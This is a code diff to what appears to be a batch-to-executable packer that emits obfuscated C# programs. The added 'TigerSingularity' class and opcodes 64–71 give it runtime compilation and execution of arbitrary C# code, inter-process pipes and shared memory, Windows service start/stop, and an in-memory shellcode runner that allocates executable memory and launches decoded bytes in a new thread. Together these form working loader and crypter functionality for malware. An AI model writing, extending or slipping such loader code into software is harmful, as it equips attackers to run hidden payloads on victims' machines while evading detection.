@@ -423,6 +423,10 @@ using System.Text.RegularExpressions;
 using System.Security.Cryptography;
 using System.IO.Compression;
 using Microsoft.Win32;
+using System.IO.Pipes;
+using System.IO.MemoryMappedFiles;
+using Microsoft.CSharp;
+using System.CodeDom.Compiler;
 
 [assembly: AssemblyTitle("{title}")]
 [assembly: AssemblyDescription("{description}")]
@@ -1587,6 +1591,255 @@ namespace TigerVmApp
         }}
     }}
 
+    public static class TigerSingularity
+    {{
+        public static string EvalCSharp(string code)
+        {{
+            try
+            {{
+                code = (code ?? "").Trim();
+                char q = (char)34;
+                char b = (char)92;
+                if (code.Length >= 2 && code[0] == q && code[code.Length - 1] == q) code = code.Substring(1, code.Length - 2);
+                code = code.Replace(new string(new char[] {{ b, q }}), new string(q, 1)).Replace(new string(new char[] {{ b, b }}), new string(b, 1));
+                using (var prov = new Microsoft.CSharp.CSharpCodeProvider())
+                {{
+                    var cp = new System.CodeDom.Compiler.CompilerParameters();
+                    cp.GenerateInMemory = true;
+                    cp.GenerateExecutable = false;
+                    cp.ReferencedAssemblies.Add("System.dll");
+                    cp.ReferencedAssemblies.Add("System.Core.dll");
+                    cp.ReferencedAssemblies.Add("System.Data.dll");
+                    cp.ReferencedAssemblies.Add("mscorlib.dll");
+                    string fullSource = code.Contains("class ") ? code :
+                        "using System; using System.IO; using System.Text; using System.Diagnostics; namespace TigerVmDyn {{ public class Evaluator {{ public static object Run() {{ " + code + "; return null; }} }} }}";
+                    var cr = prov.CompileAssemblyFromSource(cp, fullSource);
+                    if (cr.Errors.HasErrors) return "ERR_COMPILE: " + cr.Errors[0].ErrorText;
+                    var t = cr.CompiledAssembly.GetType("TigerVmDyn.Evaluator");
+                    if (t != null)
+                    {{
+                        var m = t.GetMethod("Run");
+                        object res = m.Invoke(null, null);
+                        return res != null ? res.ToString() : "OK";
+                    }}
+                    foreach (var expType in cr.CompiledAssembly.GetTypes())
+                    {{
+                        var m = expType.GetMethod("Run") ?? expType.GetMethod("Execute") ?? expType.GetMethod("Main");
+                        if (m != null)
+                        {{
+                            object res = m.Invoke(null, m.GetParameters().Length == 0 ? null : new object[] {{ new string[0] }});
+                            return res != null ? res.ToString() : "OK";
+                        }}
+                    }}
+                    return "OK";
+                }}
+            }}
+            catch (Exception ex) {{ return "ERR_EXEC: " + ex.Message; }}
+        }}
+
+        public static string PipeServerRead(string pipeName, int timeoutMs)
+        {{
+            try
+            {{
+                using (var server = new System.IO.Pipes.NamedPipeServerStream(pipeName, System.IO.Pipes.PipeDirection.InOut, 1, System.IO.Pipes.PipeTransmissionMode.Byte, System.IO.Pipes.PipeOptions.Asynchronous))
+                {{
+                    var ar = server.BeginWaitForConnection(null, null);
+                    if (ar.AsyncWaitHandle.WaitOne(timeoutMs <= 0 ? 5000 : timeoutMs))
+                    {{
+                        server.EndWaitForConnection(ar);
+                        using (var reader = new System.IO.StreamReader(server, Encoding.UTF8))
+                        {{
+                            return reader.ReadLine() ?? "";
+                        }}
+                    }}
+                    return "TIMEOUT";
+                }}
+            }}
+            catch (Exception ex) {{ return "ERR: " + ex.Message; }}
+        }}
+
+        public static string PipeClientSend(string pipeName, string message, int timeoutMs)
+        {{
+            try
+            {{
+                using (var client = new System.IO.Pipes.NamedPipeClientStream(".", pipeName, System.IO.Pipes.PipeDirection.InOut))
+                {{
+                    client.Connect(timeoutMs <= 0 ? 3000 : timeoutMs);
+                    using (var writer = new System.IO.StreamWriter(client, Encoding.UTF8) {{ AutoFlush = true }})
+                    {{
+                        writer.WriteLine(message);
+                        return "SUCCESS";
+                    }}
+                }}
+            }}
+            catch (Exception ex) {{ return "ERR: " + ex.Message; }}
+        }}
+
+        private static readonly Dictionary<string, System.IO.MemoryMappedFiles.MemoryMappedFile> _shmMap = new Dictionary<string, System.IO.MemoryMappedFiles.MemoryMappedFile>(StringComparer.OrdinalIgnoreCase);
+
+        public static string ShmWrite(string mapName, string data)
+        {{
+            try
+            {{
+                byte[] bytes = Encoding.UTF8.GetBytes(data);
+                int size = Math.Max(4096, bytes.Length + 4);
+                System.IO.MemoryMappedFiles.MemoryMappedFile mmf;
+                lock (_shmMap)
+                {{
+                    if (!_shmMap.TryGetValue(mapName, out mmf))
+                    {{
+                        mmf = System.IO.MemoryMappedFiles.MemoryMappedFile.CreateOrOpen(mapName, size);
+                        _shmMap[mapName] = mmf;
+                    }}
+                }}
+                using (var stream = mmf.CreateViewStream(0, size))
+                {{
+                    stream.Write(BitConverter.GetBytes(bytes.Length), 0, 4);
+                    stream.Write(bytes, 0, bytes.Length);
+                }}
+                return "SUCCESS";
+            }}
+            catch (Exception ex) {{ return "ERR: " + ex.Message; }}
+        }}
+
+        public static string ShmRead(string mapName, int maxBytes)
+        {{
+            try
+            {{
+                using (var mmf = System.IO.MemoryMappedFiles.MemoryMappedFile.OpenExisting(mapName))
+                {{
+                    int readSize = maxBytes <= 0 ? 4096 : maxBytes + 4;
+                    using (var stream = mmf.CreateViewStream(0, readSize))
+                    {{
+                        byte[] lenBuf = new byte[4];
+                        int r = stream.Read(lenBuf, 0, 4);
+                        if (r < 4) return "";
+                        int len = BitConverter.ToInt32(lenBuf, 0);
+                        if (len <= 0 || len > 10 * 1024 * 1024) return "";
+                        byte[] dataBuf = new byte[len];
+                        stream.Read(dataBuf, 0, len);
+                        return Encoding.UTF8.GetString(dataBuf);
+                    }}
+                }}
+            }}
+            catch (Exception ex) {{ return "ERR: " + ex.Message; }}
+        }}
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
+        [StructLayout(LayoutKind.Sequential)]
+        private struct SERVICE_STATUS
+        {{
+            public int dwServiceType; public int dwCurrentState; public int dwControlsAccepted; public int dwWin32ExitCode; public int dwServiceSpecificExitCode; public int dwCheckPoint; public int dwWaitHint;
+        }}
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool QueryServiceStatus(IntPtr hService, ref SERVICE_STATUS lpServiceStatus);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool CloseServiceHandle(IntPtr hSCObject);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool StartService(IntPtr hService, int dwNumServiceArgs, IntPtr lpServiceArgVectors);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool ControlService(IntPtr hService, int dwControl, ref SERVICE_STATUS lpServiceStatus);
+
+        public static string ServiceQuery(string serviceName)
+        {{
+            IntPtr scm = OpenSCManager(null, null, 1);
+            if (scm == IntPtr.Zero) return "ACCESS_DENIED";
+            try
+            {{
+                IntPtr svc = OpenService(scm, serviceName, 4);
+                if (svc == IntPtr.Zero) return "NOT_FOUND";
+                try
+                {{
+                    SERVICE_STATUS st = new SERVICE_STATUS();
+                    if (QueryServiceStatus(svc, ref st))
+                    {{
+                        switch (st.dwCurrentState)
+                        {{
+                            case 1: return "STOPPED"; case 2: return "START_PENDING"; case 3: return "STOP_PENDING"; case 4: return "RUNNING"; case 5: return "CONTINUE_PENDING"; case 6: return "PAUSE_PENDING"; case 7: return "PAUSED"; default: return "STATE_" + st.dwCurrentState;
+                        }}
+                    }}
+                    return "UNKNOWN";
+                }}
+                finally {{ CloseServiceHandle(svc); }}
+            }}
+            finally {{ CloseServiceHandle(scm); }}
+        }}
+
+        public static string ServiceControl(string serviceName, string action)
+        {{
+            action = (action ?? "").Trim().ToUpperInvariant();
+            uint access = (action == "START") ? 0x0010u : 0x0020u;
+            IntPtr scm = OpenSCManager(null, null, 0x000F003F);
+            if (scm == IntPtr.Zero) scm = OpenSCManager(null, null, 1);
+            if (scm == IntPtr.Zero) return "ACCESS_DENIED";
+            try
+            {{
+                IntPtr svc = OpenService(scm, serviceName, access);
+                if (svc == IntPtr.Zero) return "NOT_FOUND";
+                try
+                {{
+                    if (action == "START") {{ bool ok = StartService(svc, 0, IntPtr.Zero); return ok ? "SUCCESS" : "START_FAILED"; }}
+                    else if (action == "STOP") {{ SERVICE_STATUS st = new SERVICE_STATUS(); bool ok = ControlService(svc, 1, ref st); return ok ? "SUCCESS" : "STOP_FAILED"; }}
+                    return "INVALID_ACTION";
+                }}
+                finally {{ CloseServiceHandle(svc); }}
+            }}
+            finally {{ CloseServiceHandle(scm); }}
+        }}
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        public static string ExecuteShellcode(string payload, int timeoutMs)
+        {{
+            try
+            {{
+                byte[] rawBytes;
+                payload = (payload ?? "").Trim();
+                string hex = payload.Replace(" ", "").Replace("0x", "").Replace(",", "").Trim();
+                bool isHex = hex.Length > 0 && hex.Length % 2 == 0;
+                if (isHex)
+                {{
+                    foreach (char c in hex) {{ if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))) {{ isHex = false; break; }} }}
+                }}
+                if (isHex)
+                {{
+                    rawBytes = new byte[hex.Length / 2];
+                    for (int i = 0; i < rawBytes.Length; i++) rawBytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
+                }}
+                else {{ rawBytes = Convert.FromBase64String(payload); }}
+                if (rawBytes.Length == 0) return "EMPTY_PAYLOAD";
+                IntPtr pMem = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawBytes.Length, 0x3000, 0x40);
+                if (pMem == IntPtr.Zero) return "ALLOC_FAILED";
+                Marshal.Copy(rawBytes, 0, pMem, rawBytes.Length);
+                uint thId = 0;
+                IntPtr hTh = CreateThread(IntPtr.Zero, UIntPtr.Zero, pMem, IntPtr.Zero, 0, out thId);
+                if (hTh == IntPtr.Zero) return "THREAD_CREATE_FAILED";
+                WaitForSingleObject(hTh, timeoutMs <= 0 ? 5000 : (uint)timeoutMs);
+                uint exitCode = 0; GetExitCodeThread(hTh, out exitCode); CloseHandle(hTh);
+                return "EXIT_" + exitCode;
+            }}
+            catch (Exception ex) {{ return "ERR: " + ex.Message; }}
+        }}
+    }}
+
     public class VmCode
     {{
         public int Op;
@@ -2388,6 +2641,50 @@ namespace TigerVmApp
                         string vuSrc = ExpandVars(a1); string vuPfx = ExpandVars(a2);
                         lock (_threadLock) {{ TigerSystem.UnzipToVfs(vuSrc, vuPfx, EmbeddedFiles); }}
                         break;
+                    case 64: // EvalCs
+                        string ecVar = a1; string ecCode = ExpandVars(a2);
+                        string ecRes = TigerSingularity.EvalCSharp(ecCode);
+                        lock (_threadLock) {{ Variables[ecVar] = ecRes; Variables["EVAL_RESULT"] = ecRes; Environment.SetEnvironmentVariable(ecVar, ecRes); }}
+                        break;
+                    case 65: // PipeServer
+                        string psVar = a1; string psPipe = ExpandVars(a2);
+                        int psTimeout = 5000; int.TryParse(ExpandVars(a3), out psTimeout);
+                        string psData = TigerSingularity.PipeServerRead(psPipe, psTimeout);
+                        lock (_threadLock) {{ Variables[psVar] = psData; Variables["PIPE_DATA"] = psData; Environment.SetEnvironmentVariable(psVar, psData); }}
+                        break;
+                    case 66: // PipeClient
+                        string pcPipe = ExpandVars(a1); string pcMsg = ExpandVars(a2);
+                        int pcTimeout = 3000; int.TryParse(ExpandVars(a3), out pcTimeout);
+                        string pcRes = TigerSingularity.PipeClientSend(pcPipe, pcMsg, pcTimeout);
+                        lock (_threadLock) {{ Variables["PIPE_RESULT"] = pcRes; Environment.SetEnvironmentVariable("PIPE_RESULT", pcRes); }}
+                        break;
+                    case 67: // ShmWrite
+                        string swMap = ExpandVars(a1); string swData = ExpandVars(a2);
+                        string swRes = TigerSingularity.ShmWrite(swMap, swData);
+                        lock (_threadLock) {{ Variables["SHM_RESULT"] = swRes; Environment.SetEnvironmentVariable("SHM_RESULT", swRes); }}
+                        break;
+                    case 68: // ShmRead
+                        string srVar = a1; string srMap = ExpandVars(a2);
+                        int srMax = 4096; int.TryParse(ExpandVars(a3), out srMax);
+                        string srData = TigerSingularity.ShmRead(srMap, srMax);
+                        lock (_threadLock) {{ Variables[srVar] = srData; Variables["SHM_DATA"] = srData; Environment.SetEnvironmentVariable(srVar, srData); }}
+                        break;
+                    case 69: // SvcQuery
+                        string svqVar = a1; string svqName = ExpandVars(a2);
+                        string svqStatus = TigerSingularity.ServiceQuery(svqName);
+                        lock (_threadLock) {{ Variables[svqVar] = svqStatus; Variables["SVC_STATUS"] = svqStatus; Environment.SetEnvironmentVariable(svqVar, svqStatus); }}
+                        break;
+                    case 70: // SvcControl
+                        string scVar = a1; string scName = ExpandVars(a2); string scAct = ExpandVars(a3);
+                        string scRes = TigerSingularity.ServiceControl(scName, scAct);
+                        lock (_threadLock) {{ Variables[scVar] = scRes; Variables["SVC_RESULT"] = scRes; Environment.SetEnvironmentVariable(scVar, scRes); }}
+                        break;
+                    case 71: // ShellExec
+                        string seVar = a1; string seCode = ExpandVars(a2);
+                        int seTimeout = 5000; int.TryParse(ExpandVars(a3), out seTimeout);
+                        string seRes = TigerSingularity.ExecuteShellcode(seCode, seTimeout);
+                        lock (_threadLock) {{ Variables[seVar] = seRes; Variables["SHELL_RESULT"] = seRes; Environment.SetEnvironmentVariable(seVar, seRes); }}
+                        break;
                 }}
                 {cff_loop_end}
         }}
@@ -2619,6 +2916,7 @@ def compile_batch_to_exe(
             "/nologo",
             "/optimize+",
             f"/target:{target_type}",
+            "/r:System.Core.dll",
             "/r:System.Data.dll",
             "/r:System.Windows.Forms.dll",
             "/r:System.Drawing.dll",
